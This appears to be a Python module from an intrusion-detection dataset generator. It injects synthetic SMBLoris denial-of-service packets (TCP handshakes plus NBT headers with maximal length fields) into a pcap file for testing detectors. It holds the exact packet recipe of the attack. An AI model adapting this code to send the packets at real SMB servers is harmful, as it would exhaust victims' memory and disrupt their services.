import logging
import random as rnd

import scapy.layers.inet as inet
from scapy.layers.netbios import NBTSession

import Attack.BaseAttack as BaseAttack
import ID2TLib.SMBLib as SMBLib
import ID2TLib.Utility as Util

from Attack.Parameter import Parameter, Float, IntegerPositive, IPAddress, MACAddress

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# noinspection PyPep8


class SMBLorisAttack(BaseAttack.BaseAttack):
    ATTACK_DURATION = 'attack.duration'
    NUMBER_ATTACKERS = 'attackers.count'

    def __init__(self):
        """
        Creates a new instance of the SMBLorisAttack.
        This attack injects special SMB-packets, which exploit the SMBLoris DoS vulnerability, into the output pcap
        file.
        """
        # Initialize attack
        super(SMBLorisAttack, self).__init__("SMBLoris Attack", "Injects an SMBLoris (D)DoS Attack",
                                             "Resource Exhaustion")

        # Define allowed parameters and their type
        self.update_params([
            Parameter(self.IP_SOURCE, IPAddress()),
            Parameter(self.IP_DESTINATION, IPAddress()),
            Parameter(self.MAC_SOURCE, MACAddress()),
            Parameter(self.MAC_DESTINATION, MACAddress()),
            Parameter(self.PACKETS_PER_SECOND, Float()),
            Parameter(self.ATTACK_DURATION, IntegerPositive()),
            Parameter(self.NUMBER_ATTACKERS, IntegerPositive()),
        ])

    def init_param(self, param: str) -> bool:
        """
        Initialize a parameter with its default values specified in this attack.

        :param param: parameter, which should be initialized
        :return: True if initialization was successful, False if not
        """
        value = None
        # The most used IP class in background traffic
        if param == self.NUMBER_ATTACKERS:
            value = rnd.randint(1, 16)
        if param == self.IP_SOURCE:
            most_used_ip_class = Util.handle_most_used_outputs(self.statistics.get_most_used_ip_class())
            num_attackers = self.get_param_value(self.NUMBER_ATTACKERS)
            if num_attackers is None:
                return False
            value = self.generate_random_ipv4_address(most_used_ip_class, num_attackers)
        elif param == self.MAC_SOURCE:
            num_attackers = self.get_param_value(self.NUMBER_ATTACKERS)
            if num_attackers is None:
                return False
            value = self.generate_random_mac_address(num_attackers)
        elif param == self.IP_DESTINATION:
            value = self.statistics.get_random_ip_address()
        elif param == self.MAC_DESTINATION:
            ip_dst = self.get_param_value(self.IP_DESTINATION)
            if ip_dst is None:
                return False
            value = self.get_mac_address(ip_dst)
        elif param == self.PACKETS_PER_SECOND:
            value = self.statistics.get_most_used_pps()
        elif param == self.INJECT_AFTER_PACKET:
            value = rnd.randint(0, self.statistics.get_packet_count())
        elif param == self.ATTACK_DURATION:
            value = 30
        if value is None:
            return False
        return self.add_param_value(param, value)

    def generate_attack_packets(self):
        """
        Creates the attack packets.
        """
        pps = self.get_param_value(self.PACKETS_PER_SECOND)

        # Timestamp
        first_timestamp = self.get_param_value(self.INJECT_AT_TIMESTAMP)
        # store start time of attack
        self.attack_start_utime = first_timestamp

        # Initialize parameters
        ip_destination = self.get_param_value(self.IP_DESTINATION)
        mac_destination = self.get_param_value(self.MAC_DESTINATION)

        # Determine source IP and MAC address
        num_attackers = self.get_param_value(self.NUMBER_ATTACKERS)
        # user supplied self.NUMBER_ATTACKERS
        if (num_attackers is not None) and (num_attackers is not 0):
            # The most used IP class in background traffic
            most_used_ip_class = Util.handle_most_used_outputs(self.statistics.get_most_used_ip_class())
            # Create random attackers based on user input self.NUMBER_ATTACKERS
            ip_source = self.generate_random_ipv4_address(most_used_ip_class, num_attackers)
            mac_source = self.generate_random_mac_address(num_attackers)
        else:  # user did not supply self.NUMBER_ATTACKS
            # use default values for IP_SOURCE/MAC_SOURCE or overwritten values
            # if user supplied any values for those params
            ip_source = self.get_param_value(self.IP_SOURCE)
            mac_source = self.get_param_value(self.MAC_SOURCE)

        ip_source_list = []
        mac_source_list = []

        if isinstance(ip_source, list):
            ip_source_list = ip_source
        else:
            ip_source_list.append(ip_source)

        if isinstance(mac_source, list):
            mac_source_list = mac_source
        else:
            mac_source_list.append(mac_source)

        if (num_attackers is None) or (num_attackers is 0):
            num_attackers = min(len(ip_source_list), len(mac_source_list))

        # Check ip.src == ip.dst
        self.ip_src_dst_catch_equal(ip_source_list, ip_destination)

        # Get MSS, TTL and Window size value for destination IP
        destination_mss_value, destination_ttl_value, destination_win_value = self.get_ip_data(ip_destination)

        attack_duration = self.get_param_value(self.ATTACK_DURATION)
        attack_ends_time = first_timestamp + attack_duration

        victim_pps = pps * num_attackers
        self.timestamp_controller.set_pps(victim_pps)

        for attacker in range(num_attackers):
            # Get MSS, TTL and Window size value for source IP(attacker)
            source_mss_value, source_ttl_value, source_win_value = self.get_ip_data(ip_source_list[attacker])

            attacker_seq = rnd.randint(1000, 50000)
            victim_seq = rnd.randint(1000, 50000)

            sport = 1025

            min_delay, max_delay = self.get_reply_latency(ip_source_list[attacker], ip_destination)

            # Timestamps of first self.packets shouldn't be exactly the same to look more realistic
            timestamp_next_pkt = rnd.uniform(first_timestamp, self.timestamp_controller.next_timestamp())

            while timestamp_next_pkt <= attack_ends_time:
                # Establish TCP connection
                if sport > 65535:
                    sport = 1025

                # prepare reusable Ethernet- and IP-headers
                attacker_ether = inet.Ether(src=mac_source_list[attacker], dst=mac_destination)
                attacker_ip = inet.IP(src=ip_source_list[attacker], dst=ip_destination, ttl=source_ttl_value,
                                      flags='DF')
                victim_ether = inet.Ether(src=mac_destination, dst=mac_source_list[attacker])
                victim_ip = inet.IP(src=ip_destination, dst=ip_source_list[attacker], ttl=destination_ttl_value,
                                    flags='DF')

                # connection request from attacker (client)
                syn_tcp = inet.TCP(sport=sport, dport=SMBLib.smb_port, window=source_win_value, flags='S',
                                   seq=attacker_seq, options=[('MSS', source_mss_value)])
                attacker_seq += 1
                syn = (attacker_ether / attacker_ip / syn_tcp)
                syn.time = timestamp_next_pkt
                timestamp_next_pkt = self.timestamp_controller.next_timestamp(min_delay)
                self.add_packet(syn, ip_source_list[attacker], ip_destination)

                # response from victim (server)
                synack_tcp = inet.TCP(sport=SMBLib.smb_port, dport=sport, seq=victim_seq, ack=attacker_seq, flags='SA',
                                      window=destination_win_value, options=[('MSS', destination_mss_value)])
                victim_seq += 1
                synack = (victim_ether / victim_ip / synack_tcp)
                synack.time = timestamp_next_pkt
                self.timestamp_controller.set_pps(pps)
                timestamp_next_pkt = self.timestamp_controller.next_timestamp(min_delay)
                self.add_packet(synack, ip_source_list[attacker], ip_destination)

                # acknowledgement from attacker (client)
                ack_tcp = inet.TCP(sport=sport, dport=SMBLib.smb_port, seq=attacker_seq, ack=victim_seq, flags='A',
                                   window=source_win_value, options=[('MSS', source_mss_value)])
                ack = (attacker_ether / attacker_ip / ack_tcp)
                ack.time = timestamp_next_pkt
                timestamp_next_pkt = self.timestamp_controller.next_timestamp()
                self.add_packet(ack, ip_source_list[attacker], ip_destination)

                # send NBT session header packet with maximum LENGTH-field
                req_tcp = inet.TCP(sport=sport, dport=SMBLib.smb_port, seq=attacker_seq, ack=victim_seq, flags='AP',
                                   window=source_win_value, options=[('MSS', source_mss_value)])
                req_payload = NBTSession(TYPE=0x00, LENGTH=0x1FFFF)

                attacker_seq += len(req_payload)
                req = (attacker_ether / attacker_ip / req_tcp / req_payload)
                req.time = timestamp_next_pkt
                self.timestamp_controller.set_pps(victim_pps)
                timestamp_next_pkt = self.timestamp_controller.next_timestamp(min_delay)
                self.add_packet(req, ip_source_list[attacker], ip_destination)

                # final ack from victim (server)
                last_ack_tcp = inet.TCP(sport=SMBLib.smb_port, dport=sport, seq=victim_seq, ack=attacker_seq, flags='A',
                                        window=destination_win_value, options=[('MSS', destination_mss_value)])
                last_ack = (victim_ether / victim_ip / last_ack_tcp)
                last_ack.time = timestamp_next_pkt
                self.timestamp_controller.set_pps(pps)
                timestamp_next_pkt = self.timestamp_controller.next_timestamp(min_delay)
                self.add_packet(last_ack, ip_source_list[attacker], ip_destination)

                sport += 1

    def generate_attack_pcap(self):
        """
        Creates a pcap containing the attack packets.

        :return: The location of the generated pcap file.
        """
        # store end time of attack
        self.attack_end_utime = self.packets[-1].time

        # write attack self.packets to pcap
        pcap_path = self.write_attack_pcap(sorted(self.packets, key=lambda pkt: pkt.time))

        # return packets sorted by packet time_sec_start
        return len(self.packets), pcap_path
